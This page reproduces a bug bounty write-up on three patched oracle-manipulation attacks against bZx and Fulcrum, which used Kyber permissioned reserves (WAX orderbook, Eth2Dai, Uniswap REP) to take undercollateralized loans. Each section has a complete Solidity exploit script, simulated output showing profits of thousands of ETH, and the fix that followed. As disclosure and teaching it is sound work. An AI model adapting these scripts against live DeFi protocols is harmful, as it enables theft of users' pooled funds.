# bZx and Fulcrum (Bug Bounty)

{% hint style="warning" %}
The following content was copied from [samczun's bug bounty report](https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/) on bugs that he discovered and were patched consequently by bZx and Fulcrum, this was not an actual exploit.
{% endhint %}

## Introduction

[bZx](https://bzx.network/) is a decentralized margin-trading protocol, while [Fulcrum](https://fulcrum.trade/#/) is a project built by the bZx team on top of bZx itself. One feature of Fulcrum is the ability to take a loan on an _iToken_ (read more about that [here](https://medium.com/bzxnetwork/introducing-fulcrum-tokenized-margin-made-dead-simple-e65ccc82393f)) using any\* other token as collateral. In order to determine how much collateral is needed, bZx uses the [Kyber Network](https://kyber.network/) as an on-chain decentralized oracle to check the conversion rate between the collateral token and the loan token.\
\* if it's tradable on Kyber

However, it's important to first understand how the Kyber Network functions. Unlike most other DEXes, the Kyber Network derives liquidity from _reserves_ (read more about that [here](https://developer.kyber.network/docs/Reserves-Intro/)). When a user wants to make a trade between two tokens A and B, the main Kyber contract will query all registered reserves for the best rate between A/ETH and ETH/B, then perform the trade using the two reserves selected.

Reserves can be listed automatically through the _PermissionlessOrderbookReserveLister_ contract, which will create a _permissionless_ reserve. Reserves can also be listed by the Kyber team on behalf of a market maker after KYC and legal requirements are met. In this case, the reserve will be a _permissioned_ reserve. When conducting a trade using Kyber, traders have the option of only using permissioned reserves, or using all available reserves.

## The attack

When bZx checks the price of a collateral token, it specifies that only permissioned reserves should be used. This decision was made based on the Kyber whitepaper at the time, with the logic being that permissioned reserves had to undergo review and so the rates should be "correct".![](https://samczsun.com/content/images/2019/09/image.png)[Source](https://whitepaper.io/document/43/kyber-network-whitepaper), Credit: Kyber Network

This means that if we can somehow increase the rate reported by a permissioned reserve, we can trick Fulcrum into thinking our collateral is worth more than it really is.

## A permissioned OrderbookReserve

On June 16 2019, the Kyber team listed an OrderbookReserve for the WAX token as a permissioned reserve in [this transaction](https://etherscan.io/tx/0xce7df57e6b6d5589f19125b9298bbb36e672d373196d7610073540f59220c318). This was interesting because the statement "an OrderbookReserve is always permissioned" was considered to be axiomatic.

After this reserve was listed, the Kyber Network itself continued to perform according to specifications. However, we can now significantly affect the apparent exchange rate between WAX and ETH simply by listing an order, which means that we can trick any project which relies on Kyber to provide an accurate FMV.

### **Demo**

The following script will turn a profit of approximately 1200ETH by:

1. Listing an order buying 1 WAX for 10 ETH, increasing the price from 0.00ETH/WAX to 10ETH/WAX
2. Borrowing DAI from bZx using WAX as a collateral
3. Cancelling all orders and converting all assets to ETH

```
contract BZxWAXExploit is Script, Constants, TokenHelper, BZxHelpers {
    BZxLoanTokenV2Like private constant BZX_DAI = BZxLoanTokenV2Like(0x14094949152EDDBFcd073717200DA82fEd8dC960);
    
    ERC20Like private constant WAX = ERC20Like(0x39Bb259F66E1C59d5ABEF88375979b4D20D98022);
    OrderbookReserveLike private constant WAX_ORDER_BOOK = OrderbookReserveLike(0x75fF6BeC6Ed398FA80EA1596cef422D64681F057);
    
    uint constant private INITIAL_BALANCE = 150 ether;
    
    function setup() public {
        name("bzx-wax-exploit");
        blockNumber(8455720);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.makeOrder)
            .then(this.checkRates)
            .then(this.borrow)
            .then(this.cleanup)
            .finally(this.checkProfits);
    }
    
    uint constant rateCheckAmount = 1e8;
    
    function checkRates() external {
        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(WAX, KYBER_ETH, rateCheckAmount);
        printf("checking rates tokens=%.8u rate=%.18u slippage=%.18u\n", abi.encode(rateCheckAmount, rate, slippage));
    }
    
    uint constant waxBidAmount = 1e8;
    uint constant ethOfferAmount = 10 ether;
    uint32 private orderId;
    function makeOrder() external {
        orderId = WAX_ORDER_BOOK.ethToTokenList().nextFreeId();
        
        uint kncRequired = WAX_ORDER_BOOK.calcKncStake(ethOfferAmount);
        printf("making malicious order kncRequired=%.u\n", abi.encode(KNC.decimals(), kncRequired));
        
        KNC.getFromUniswap(kncRequired);
        WAX.getFromBancor(1 ether);
        
        WAX.approve(address(WAX_ORDER_BOOK), waxBidAmount);
        KNC.approve(address(WAX_ORDER_BOOK), kncRequired);
        
        WAX_ORDER_BOOK.depositEther.value(ethOfferAmount)(address(this));
        WAX_ORDER_BOOK.depositToken(address(this), waxBidAmount);
        WAX_ORDER_BOOK.depositKncForFee(address(this), kncRequired);
        require(WAX_ORDER_BOOK.submitEthToTokenOrder(uint128(ethOfferAmount), uint128(waxBidAmount)));
    }
    
    function borrow() external {
        bytes32 hash = doBorrow(BZX_DAI, false, BZX_DAI.marketLiquidity(), DAI, WAX);
        printf("borrowing loanHash=%32x\n", abi.encode(hash));
    }
    
    function cleanup() external {
        require(WAX_ORDER_BOOK.cancelEthToTokenOrder(orderId));
        WAX_ORDER_BOOK.withdrawEther(WAX_ORDER_BOOK.makerFunds(address(this), KYBER_ETH));
        WAX_ORDER_BOOK.withdrawToken(WAX_ORDER_BOOK.makerFunds(address(this), WAX));
        WAX_ORDER_BOOK.withdrawKncFee(WAX_ORDER_BOOK.makerKnc(address(this)));
        DAI.giveAllToUniswap();
        KNC.giveAllToUniswap();
        WAX.giveAllToBancor();
        WETH.withdrawAll();
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
    
    function borrowInterest(uint amount) internal {
        DAI.getFromUniswap(amount);
    }
}

/*
### running script "bzx-wax-exploit" at block 8455720
#### executing step: exploit
##### calling: checkRates()
checking rates tokens=1.00000000 rate=0.000000000000000000 slippage=0.000000000000000000
##### calling: makeOrder()
making malicious order kncRequired=127.438017578344399080
##### calling: checkRates()
checking rates tokens=1.00000000 rate=10.000000000000000000 slippage=9.700000000000000000
##### calling: borrow()
collateral_required=232.02826470, interest_required=19750.481385867262370788
borrowing loanHash=0x2cca5c037a25b47338027b9d1bed55d6bc131b3d1096925538f611240d143c64
##### calling: cleanup()
##### calling: checkProfits()
profits=1170.851523093083307797
#### finished executing step: exploit
*/
```

### **Solution**

The bZx team blocked this attack by whitelisting tokens which can be used as collateral.

## Eth2Dai

Now that there's a whitelist on the tokens that can be used as collateral, we'll need to through all the permissioned reserves to see if there's anything else that we can abuse. It turns out that DAI, one of the whitelisted tokens, has a permissioned reserve which integrates with Eth2Dai. As Eth2Dai allows users to create limit orders, this is essentially the previous attack but with more steps.

Interestingly, we first observe that although the Eth2Dai contract is titled `MatchingMarket`, it's not strictly true that all new orders will be automatically matched. This is because while the functions `offer(uint,ERC20,uint,ERC20,uint)` and `offer(uint,ERC20,uint,ERC20,uint,bool)` will trigger the matching logic, the function `offer(uint,ERC20,uint,ERC20)` does not.

```
// Make a new offer. Takes funds from the caller into market escrow.
function offer(
	uint pay_amt,    //maker (ask) sell how much
	ERC20 pay_gem,   //maker (ask) sell which token
	uint buy_amt,    //maker (ask) buy how much
	ERC20 buy_gem,   //maker (ask) buy which token
	uint pos         //position to insert offer, 0 should be used if unknown
)
	public
	can_offer
	returns (uint)
{
	return offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);
}

function offer(
	uint pay_amt,    //maker (ask) sell how much
	ERC20 pay_gem,   //maker (ask) sell which token
	uint buy_amt,    //maker (ask) buy how much
	ERC20 buy_gem,   //maker (ask) buy which token
	uint pos,        //position to insert offer, 0 should be used if unknown
	bool rounding    //match "close enough" orders?
)
	public
	can_offer
	returns (uint)
{
	require(!locked, "Reentrancy attempt");
	require(_dust[pay_gem] <= pay_amt);

	if (matchingEnabled) {
	  return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, rounding);
	}
	return super.offer(pay_amt, pay_gem, buy_amt, buy_gem);
}
```

[Source](https://github.com/makerdao/maker-otc/blob/d1c5e3f52258295252fabc78652a1a55ded28bc6/src/matching\_market.sol#L113-L147)

Furthermore, we observe that even though the comments seem to suggest that only authorized users can call `offer(uint,ERC20,uint,ERC20)`, there's no authorization logic at all.

```
// Make a new offer. Takes funds from the caller into market escrow.
//
// If matching is enabled:
//     * creates new offer without putting it in
//       the sorted list.
//     * available to authorized contracts only!
//     * keepers should call insert(id,pos)
//       to put offer in the sorted list.
//
// If matching is disabled:
//     * calls expiring market's offer().
//     * available to everyone without authorization.
//     * no sorting is done.
//
function offer(
	uint pay_amt,    //maker (ask) sell how much
	ERC20 pay_gem,   //maker (ask) sell which token
	uint buy_amt,    //taker (ask) buy how much
	ERC20 buy_gem    //taker (ask) buy which token
)
	public
	returns (uint)
{
	require(!locked, "Reentrancy attempt");
	var fn = matchingEnabled ? _offeru : super.offer;
	return fn(pay_amt, pay_gem, buy_amt, buy_gem);
}
```

While in practice lack of authorization is irrelevant as arbitrage bots will quickly fill any orders that can be automatically matched, in an atomic transaction we can create and cancel arbitrage-able orders and no bots will be able to fill them.

All that's left is to slightly modify our script from the previous attack to place orders on Eth2Dai instead of the OrderbookReserve. Note that in this case we will need to call both `order(uint,ERC20,uint,ERC20)` to submit the order to Eth2Dai without it being atomically matched, and then `insert(uint,uint)` in order to manually sort the order without triggering matching.

### **Demo**

The following script will turn a profit of approximately 2500ETH by:

1. Listing an order buying 1 DAI for 10 ETH, increasing the price from 0.006ETH/DAI to 9.98ETH/DAI.
2. Borrowing ETH from bZx using DAI as collateral
3. Cancelling all orders and converting all assets to ETH

```
contract BZxOasisExploit is Script, Constants, TokenHelper, BZxHelpers {
    BZxLoanTokenV2Like private constant BZX_ETH = BZxLoanTokenV2Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);
    
    uint constant private INITIAL_BALANCE = 250 ether;
    
    function setup() public {
        name("bzx-oasis-exploit");
        blockNumber(8455720);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.makeOrder)
            .then(this.checkRates)
            .then(this.borrow)
            .then(this.cleanup)
            .finally(this.checkProfits);
    }
    
    uint constant rateCheckAmount = 1 ether;
    
    function checkRates() external {
        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(DAI, KYBER_ETH, rateCheckAmount);
        printf("checking rates tokens=%.18u rate=%.18u slippage=%.18u\n", abi.encode(rateCheckAmount, rate, slippage));
    }
    
    uint private id;
    
    uint constant daiBidAmount = 1 ether;
    uint constant ethOfferAmount = 10 ether;
    function makeOrder() external {
        WETH.deposit.value(ethOfferAmount)();
        WETH.approve(address(MATCHING_MARKET), ethOfferAmount);
        id = MATCHING_MARKET.offer(ethOfferAmount, WETH, daiBidAmount, DAI);
        printf("made order id=%u\n", abi.encode(id));
        
        require(MATCHING_MARKET.insert(id, 0));
    }
    
    function borrow() external {
        bytes32 hash = doBorrow(BZX_ETH, false, BZX_ETH.marketLiquidity(), WETH, DAI);
        printf("borrowing loanHash=%32x\n", abi.encode(hash));
    }
    
    function cleanup() external {
        require(MATCHING_MARKET.cancel(id));
        DAI.giveAllToUniswap();
        WETH.withdrawAll();
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
    
    function borrowInterest(uint amount) internal {
        WETH.deposit.value(amount)();
    }
    
    function borrowCollateral(uint amount) internal {
        DAI.getFromUniswap(amount);
    }
}

/*
### running script "bzx-oasis-exploit" at block 8455720
#### executing step: exploit
##### calling: checkRates()
checking rates tokens=1.000000000000000000 rate=0.005950387240736517 slippage=0.005771875623514421
##### calling: makeOrder()
made order id=414191
##### calling: checkRates()
checking rates tokens=1.000000000000000000 rate=9.975000000000000000 slippage=9.675750000000000000
##### calling: borrow()
collateral_required=398.831304885561111810, interest_required=203.458599916962956188
borrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c
##### calling: cleanup()
##### calling: checkProfits()
profits=2446.376892708285686012
#### finished executing step: exploit
*/
```

### **Solution**

The bZx team blocked this attack by modifying the oracle logic such that if the collateral and loan token were both either DAI or WETH, then the exchange rate would be loaded directly from Maker's oracles.

However, this solution was incomplete because of the way Kyber resolves the best rate. If you'll recall, Kyber determines the best rate for A/B by determining the best rate for A/ETH and ETH/B, then calculating the amount of B that could be bought with the ETH received by trading A.

This meant that if we were to attempt to borrow a non-ETH token such as USDC using DAI as collateral, Kyber would first determine the best exchange rate for DAI/ETH, then the best rate for ETH/USDC, and finally the best rate for DAI/USDC. Because we can artificially increase the exchange rate for DAI/ETH, we can still manipulate the exchange rate for DAI/USDC even though we don't control a permissioned USDC reserve.

The bZx team blocked this attack in two ways:

1. If either the loan token or collateral token wasn't ETH, then bZx would manually determine the exchange rate between the token and ETH, unless
2. The loan token or collateral token was a USD-based stablecoin, in which case bZx would use the rate from Maker's oracle

## Uniswap

An astute reader may notice at this point that bZx's solution still does not handle incorrect FMVs for arbitrary tokens. This means that if we can find another permissioned reserve which can be manipulated, we can take out yet another undercollateralized loan.

After sifting through all the registered permissioned reserves for the whitelisted tokens, we notice that the REP token has a reserve which integrates with Uniswap. We already know from our attacks on DDEX that Uniswap's prices can be manipulated, so we can re-purpose our previous attack and substitute Eth2Dai and DAI for Uniswap and REP.

### **Demo**

The following script will turn a profit of approximately 2500ETH by:

1. Performing a large order buy on Uniswap's REP exchange, increasing the price from 0.05ETH/REP to 6.05ETH/REP
2. Borrowing ETH from bZx using REP as collateral
3. Cancelling all orders and convert all assets to ETH

```
contract BZxUniswapExploit is Script, Constants, TokenHelper, BZxHelpers {
    BZxLoanTokenV3Like private constant BZX_ETH = BZxLoanTokenV3Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);
    
    uint constant private INITIAL_BALANCE = 5000 ether;
    
    function setup() public {
        name("bzx-uniswap-exploit");
        blockNumber(8547500);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.makeOrder)
            .then(this.checkRates)
            .then(this.borrow)
            .then(this.cleanup)
            .finally(this.checkProfits);
    }
    
    uint constant rateCheckAmount = 10 ether;
    
    function checkRates() external {
        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(REP, KYBER_ETH, rateCheckAmount);
        printf("checking rates tokens=%.18u rate=%.18u slippage=%.18u\n", abi.encode(rateCheckAmount, rate, slippage));
    }
    
    function makeOrder() external {
        UniswapLike uniswap = REP.getUniswapExchange();
        uint totalSupply = REP.balanceOf(address(uniswap));
        uint borrowAmount = totalSupply * 90 / 100;
        REP.getFromUniswap(borrowAmount);
        printf("making order totalSupply=%.18u borrowed=%.18u\n", abi.encode(totalSupply, borrowAmount));
    }
    
    function borrow() external {
        bytes32 hash = doBorrow(BZX_ETH, true, BZX_ETH.marketLiquidity(), WETH, REP);
        printf("borrowing loanHash=%32x\n", abi.encode(hash));
    }
    
    function cleanup() external {
        REP.giveAllToUniswap();
        WETH.withdrawAll();
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
    
    function borrowInterest(uint amount) internal {
        WETH.deposit.value(amount)();
    }
}

/*
### running script "bzx-uniswap-exploit" at block 8547500
#### executing step: exploit
##### calling: checkRates()
checking rates tokens=10.000000000000000000 rate=0.057621091203633720 slippage=0.055892458467524708
##### calling: makeOrder()
making order totalSupply=8856.102959786215028808 borrowed=7970.492663807593525927
##### calling: checkRates()
checking rates tokens=10.000000000000000000 rate=5.656379870360426078 slippage=5.486688474249613295
##### calling: borrow()
collateral_required=702.265284613341236862, interest_required=205.433213643594588344
borrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c
##### calling: cleanup()
##### calling: checkProfits()
profits=2425.711777227580307468
#### finished executing step: exploit
*/
```

### **Solution**

The bZx team reverted their changes for the previous attack and instead implemented a spread check, such that if the spread was above a certain threshold then the loan would be rejected. This solution handles the generic case so long as both tokens being queried has at least one non-manipulable reserve on Kyber, which is currently the case for all whitelisted tokens.
